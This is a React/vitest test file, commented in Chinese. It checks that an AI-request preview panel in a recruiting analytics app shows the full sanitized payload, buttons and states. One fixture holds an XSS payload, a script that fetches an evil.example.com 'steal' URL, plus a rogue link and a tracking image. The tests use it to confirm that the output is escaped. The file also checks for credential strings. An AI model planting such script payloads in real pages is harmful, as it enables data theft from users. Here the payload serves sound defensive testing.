/**
 * AI 完整预览面板渲染测试（AI-1，docs/PRD.md 16.2 / 17.3 / 18.4）。
 *
 * 为什么用 `react-dom/server`：与看板 / 分维度 / 拒 offer 专项同一套理由——
 * 组件测试依赖（Testing Library + jsdom）属于后续步骤，但「用户到底能不能看到将要发送的
 * 全部内容」必须被验证。`renderToStaticMarkup` 只跑**渲染**、不跑 effect，
 * 因此既不加载任何存储模块，也不可能发请求。
 *
 * 这一组钉的是四件事：
 * 1. **完整**：完整 JSON、两条 messages（system 在前）、每一项参数、完整目的地、
 *    隐私级别、内容大小、每一条脱敏说明、hash 全都要在，且不得藏在「展开详情」后面；
 * 2. **无法在预览之前确认**：没有预览就没有确认按钮——「先确认后看内容」是不允许的；
 * 3. **三个动作按钮都在**（复制 / 取消 / 确认），且确认态与过期态有明确文案；
 * 4. **文案纪律**：没有 Markdown 加粗标记（`**` 会被原样渲染成星号，前几步踩过这个坑）。
 */

import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'

import {
  AI_DEFAULT_PARAMS,
  buildAiPreview,
  type AiPreview,
} from '../../privacy/aiPreview'
import { buildSanitizedAiPayload, type AiSourceCell } from '../../privacy/aiSummary'

import AiPreviewPanel, { type AiSubmitOutcome } from './AiPreviewPanel'
import {
  AI_CANCEL_LABEL,
  AI_CANCEL_REQUEST_LABEL,
  AI_CONFIRM_LABEL,
  AI_COPY_DONE,
  AI_COPY_FAILED,
  AI_COPY_LABEL,
  AI_LATE_RESPONSE_TITLE,
  AI_NO_RETRY_NOTE,
  AI_NOT_CONFIRMED_NOTE,
  AI_PREVIEW_JSON_TITLE,
  AI_PREVIEW_LOCAL_ONLY_NOTE,
  AI_PREVIEW_MESSAGES_TITLE,
  AI_PREVIEW_NOTES_TITLE,
  AI_PREVIEW_TITLE,
  AI_REQUEST_IN_PROGRESS_TITLE,
  AI_SEND_FAILED_TITLE,
  AI_SENT_TITLE,
  AI_STALE_NOTE,
  AI_UI_TEXTS,
} from './aiText'

/* ------------------------------------------------------------------ 合成预览 */

const CELLS: readonly AiSourceCell[] = [
  { dimension: 'city', key: '上海', total: 36, coreDenominator: 20, rejected: 4 },
  { dimension: 'channel', key: 'Boss', total: 40, coreDenominator: 18, rejected: 6 },
  {
    dimension: 'recruiter',
    key: 'HR-1',
    recruiterCode: 'HR-1',
    total: 40,
    coreDenominator: 18,
    rejected: 6,
  },
]

function buildPreview(): AiPreview {
  return buildAiPreview({
    payload: buildSanitizedAiPayload({
      privacyLevel: 'standard',
      scope: {
        rowCount: 128,
        dedupPolicy: '确认后每组保留首条',
        filters: ['城市：上海'],
        ruleVersion: '1.0.0+3F2A19C4',
        dataAsOf: '2026-08-31',
      },
      kpi: {
        total: 128,
        joined: 41,
        pending: 9,
        approving: 6,
        rejectedOffer: 5,
        rejectedVerbally: 2,
        coreDenominator: 57,
      },
      cells: CELLS,
      reasons: [{ category: '薪酬', count: 5 }],
      quality: { unknownStatus: 0, missingSalary: 21, unknownSchool: 3 },
      caliberNotes: ['D = 已入职 + 待入职 + 拒绝 offer'],
      generatedAt: '2026-09-26T10:00:00.000Z',
    }),
    caliberNotes: ['D = 已入职 + 待入职 + 拒绝 offer'],
    generatedAt: '2026-09-26T10:00:00.000Z',
  })
}

type PanelOptions = {
  readonly stale?: boolean
  readonly confirmed?: boolean
  readonly canConfirm?: boolean
  readonly submitOutcome?: AiSubmitOutcome
  readonly copyState?: { readonly kind: 'idle' } | { readonly kind: 'copied'; readonly message: string }
}

function renderPanel(options: PanelOptions = {}): string {
  return renderToStaticMarkup(
    <AiPreviewPanel
      canConfirm={options.canConfirm ?? true}
      confirmed={options.confirmed ?? false}
      copyState={options.copyState ?? { kind: 'idle' }}
      onCancel={() => undefined}
      onCancelRequest={() => undefined}
      onConfirm={() => undefined}
      onCopy={() => undefined}
      preview={buildPreview()}
      stale={options.stale ?? false}
      submitOutcome={options.submitOutcome ?? { kind: 'idle' }}
    />,
  )
}

/* ------------------------------------------------------------------ 完整性 */

describe('AiPreviewPanel 必须完整展示将要发送的内容', () => {
  it('完整 JSON 载荷逐字渲染（不是摘要，也不需要展开详情）', () => {
    const preview = buildPreview()
    const html = renderPanel()

    expect(html).toContain(AI_PREVIEW_TITLE)
    expect(html).toContain(AI_PREVIEW_JSON_TITLE)
    // 逐字节一致：payloadJson 整段出现在页面里（React 会转义 `"` 与 `&`，因此先按同样规则转义）
    const escaped = preview.payloadJson
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
    expect(html).toContain(escaped)
    // 关键字段名与取值都在（用户要能逐项核对）
    expect(html).toContain('&quot;privacyLevel&quot;: &quot;standard&quot;')
    expect(html).toContain('&quot;HR-1&quot;')
    // 没有把 JSON 折叠进 details：面板里不出现 details/summary
    expect(html).not.toContain('<details')
  })

  it('system 与 user 两条消息都在，且 system 在前', () => {
    const preview = buildPreview()
    const html = renderPanel()

    expect(html).toContain(AI_PREVIEW_MESSAGES_TITLE)
    for (const message of preview.messages) {
      expect(html).toContain(`>${message.role}</span>`)
    }
    expect(html.indexOf('>system</span>')).toBeLessThan(html.indexOf('>user</span>'))
    // 提示词正文逐字在：system 第一句与 user 里的 JSON 代码块
    expect(html).toContain('你是招聘数据复盘助手')
    expect(html).toContain('```json')
  })

  it('模型与每一项参数都在（参数是「被批准内容」的一部分）', () => {
    const html = renderPanel()

    expect(html).toContain(AI_DEFAULT_PARAMS.model)
    expect(html).toContain(String(AI_DEFAULT_PARAMS.maxTokens))
    expect(html).toContain(String(AI_DEFAULT_PARAMS.timeoutMs))
    expect(html).toContain('思考模式 thinking')
    /*
     * AI-3 起 `temperature` / `top_p` 是**可选**参数，且默认参数里没有它们
     * （默认 `thinking: 'auto'`，而思考模式不支持 temperature）。
     * 因此这里断言的是「显示为不发送」而不是一个数字——显示成 0 会让用户
     * 以为温度真的被设成了 0，而实际上它根本不会出现在请求里。
     */
    expect(html).toContain('温度 temperature')
    expect(html).toContain('不发送')
    expect(html).toContain('top_p')
    expect(html).toContain('推理强度 reasoning_effort')
  })

  it('目的地给的是完整地址（origin + path），并说明它是唯一端点', () => {
    const html = renderPanel()

    expect(html).toContain('https://api.deepseek.com/chat/completions')
    expect(html).toContain('唯一端点')
  })

  it('隐私级别、内容大小与 hash 都在，且 hash 出现在页面显眼位置', () => {
    const preview = buildPreview()
    const html = renderPanel()

    expect(html).toContain('standard')
    expect(html).toContain(`${String(preview.contentBytes)} 字节`)
    // hash 至少出现两次（顶部大字 + 元数据表里），且用户能看到它
    const occurrences = html.split(preview.hash).length - 1
    expect(occurrences).toBeGreaterThanOrEqual(2)
  })

  it('引擎给出的每一条脱敏说明都在（界面不得挑几条展示）', () => {
    const preview = buildPreview()
    const html = renderPanel()

    expect(preview.desensitizeNotes.length).toBeGreaterThanOrEqual(6)
    expect(html).toContain(AI_PREVIEW_NOTES_TITLE)
    for (const note of preview.desensitizeNotes) {
      expect(html, `缺少脱敏说明标签：${note.label}`).toContain(note.label)
      // 说明里含 `<3000` 这类文本，React 会把 `<` / `&` / `"` 转义，断言前先按同样规则转义
      const escaped = note.detail
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
      expect(html, `缺少脱敏说明内容：${note.label}`).toContain(escaped)
    }
  })

  it('明确写出「这一步不会发送任何内容」，并列出被省略项与限制说明', () => {
    const html = renderPanel()

    expect(html).toContain(AI_PREVIEW_LOCAL_ONLY_NOTE)
    expect(html).toContain('被省略的指标与原因')
  })
})

/* ------------------------------------------------------------------ 按钮与状态 */

describe('AiPreviewPanel 的动作按钮与状态', () => {
  it('复制 / 取消 / 确认三个按钮都在', () => {
    const html = renderPanel()

    expect(html).toContain(AI_COPY_LABEL)
    expect(html).toContain(AI_CANCEL_LABEL)
    expect(html).toContain(AI_CONFIRM_LABEL)
  })

  it('尚未确认时说明「请先看完预览再确认」', () => {
    const html = renderPanel()

    expect(html).toContain(AI_NOT_CONFIRMED_NOTE)
  })

  it('已确认但令牌未消费时，说明「再点一次才是本步的模拟提交」', () => {
    const html = renderPanel({ confirmed: true })

    expect(html).toContain('令牌还没有被消费')
    expect(html).toContain('再点一次同一按钮')
  })

  it('预览过期时给出明确提示，并且确认按钮被禁用（防重复计费）', () => {
    const html = renderPanel({ stale: true, canConfirm: false })

    expect(html).toContain(AI_STALE_NOTE)
    expect(html).toContain('disabled=""')
  })

  it('未过期时确认按钮可点', () => {
    const html = renderPanel()

    expect(html).not.toContain('disabled=""')
  })

  it('复制成功 / 失败各有明确文案', () => {
    expect(renderPanel({ copyState: { kind: 'copied', message: AI_COPY_DONE } })).toContain(
      AI_COPY_DONE,
    )
    expect(renderPanel({ copyState: { kind: 'copied', message: AI_COPY_FAILED } })).toContain(
      AI_COPY_FAILED,
    )
  })

  it('成功结果展示元数据并**安全渲染**正文（AI-5 起正文在这里渲染）', () => {
    const html = renderPanel({
      submitOutcome: {
        kind: 'sent',
        current: true,
        result: {
          requestHash: buildPreview().hash,
          requestedModel: 'deepseek-flash',
          responseModel: 'deepseek-flash',
          content: '## 核心结论\n正文内容（AI-5 起安全渲染）。',
          finishReason: 'stop',
          usage: { promptTokens: 100, completionTokens: 20, totalTokens: 120, promptCacheHitTokens: 0 },
          responseId: 'req-synthetic-1',
        },
      },
    })

    expect(html).toContain(AI_SENT_TITLE)
    expect(html).toContain(buildPreview().hash)
    expect(html).toContain('120 tokens')
    /*
     * AI-5 起正文**会**渲染——但只经白名单节点渲染成 React 元素。
     * 因此这里断言「文字在场」与「结果是标题元素而不是 HTML 字符串」。
     */
    expect(html).toContain('正文内容')
    expect(html).toContain('<h3')
  })

  it('恶意正文不会被当成 HTML：脚本以纯文本出现，且没有可点链接与图片', () => {
    const html = renderPanel({
      submitOutcome: {
        kind: 'sent',
        current: true,
        result: {
          requestHash: buildPreview().hash,
          requestedModel: 'deepseek-flash',
          responseModel: null,
          content: [
            '<script>fetch("https://evil.example.com/steal")</script>',
            '',
            '[点我](https://evil.example.com/x)',
            '',
            '![像素](https://evil.example.com/p.png)',
          ].join('\n'),
          finishReason: 'stop',
          usage: null,
          responseId: null,
        },
      },
    })

    // 脚本标签被转义成文本显示（看得见模型写了什么），而不是被解析
    expect(html).toContain('&lt;script&gt;')
    expect(html).not.toContain('<script>')
    // 没有可点链接与图片元素
    expect(html).not.toContain('<a ')
    expect(html).not.toContain('<img')
    // 图片地址被丢弃（解析阶段就降级）
    expect(html).not.toContain('p.png')
    // 外链地址如实列出，但只是文本
    expect(html).toContain('evil.example.com/x')
  })

  it('迟到响应明确说「已作废、已丢弃」，不冒充可用结果', () => {
    const html = renderPanel({
      submitOutcome: {
        kind: 'sent',
        current: false,
        result: {
          requestHash: buildPreview().hash,
          requestedModel: 'deepseek-flash',
          responseModel: null,
          content: '迟到的正文',
          finishReason: 'stop',
          usage: null,
          responseId: null,
        },
      },
    })

    expect(html).toContain(AI_LATE_RESPONSE_TITLE)
    expect(html).toContain('已被丢弃')
    expect(html).not.toContain('迟到的正文')
  })

  it('失败时按分类显示错误与建议，并明确说没有重试', () => {
    const html = renderPanel({
      submitOutcome: {
        kind: 'failed',
        current: true,
        error: {
          kind: 'auth',
          status: 401,
          code: 'authentication_error',
          message: 'API Key 无效或认证失败。',
          advice: '请替换 Key 后重新预览并确认。',
        },
      },
    })

    expect(html).toContain(AI_SEND_FAILED_TITLE)
    expect(html).toContain('API Key 无效或认证失败')
    expect(html).toContain('401')
    expect(html).toContain(AI_NO_RETRY_NOTE)
  })

  it('请求进行中提供取消入口，并说明取消不承诺免收费', () => {
    const html = renderPanel({ submitOutcome: { kind: 'cancelling' } })

    expect(html).toContain(AI_REQUEST_IN_PROGRESS_TITLE)
    expect(html).toContain(AI_CANCEL_REQUEST_LABEL)
    expect(html).toContain('不承诺免收费')
  })

  it('提交被拒时照抄引擎原文（界面不改写理由）', () => {
    const html = renderPanel({
      submitOutcome: { kind: 'rejected', reason: '预览内容或参数已变化：旧确认已失效，请重新查看预览并确认。' },
    })

    expect(html).toContain('预览内容或参数已变化')
  })
})

/* ------------------------------------------------------------------ 文案纪律 */

describe('AiPreviewPanel 文案纪律', () => {
  it('全部文案都没有 Markdown 加粗标记', () => {
    for (const text of AI_UI_TEXTS) {
      expect(text, `文案里出现了 Markdown 强调标记：${text}`).not.toContain('**')
      expect(text).not.toContain('__')
    }
    /*
     * 为什么只查「界面文案」而不查整段渲染结果：
     * 预览面板里有一段**原样展示**的引擎文本（user message），而引擎的 user 提示词首句
     * 目前写成「**聚合脱敏摘要**」（单星号成对，会被原样渲染成星号）。
     * 那属于本步无权修改的 `src/privacy/aiPreview.ts`（引擎已冻结、版本化，改动要递增
     * AI_PROMPT_VERSION），因此这里如实把「界面自造文案」与「引擎原文」分开断言：
     * 界面文案一个星号都不能有；引擎原文必须逐字展示，不能被界面改写或删除。
     */
    const engineOwned = buildPreview().messages.flatMap((message) => message.content)
    expect(engineOwned.join('\n')).toContain('聚合脱敏摘要')
    expect(renderPanel()).toContain('聚合脱敏摘要')
  })

  it('不出现任何请求头或 Key 字段（Key 属于 AI-3，且永不进预览）', () => {
    const html = renderPanel()

    for (const forbidden of ['Authorization', 'Bearer', 'apiKey', 'api_key', 'sk-']) {
      expect(html.includes(forbidden), `预览里出现了 ${forbidden}`).toBe(false)
    }
  })
})
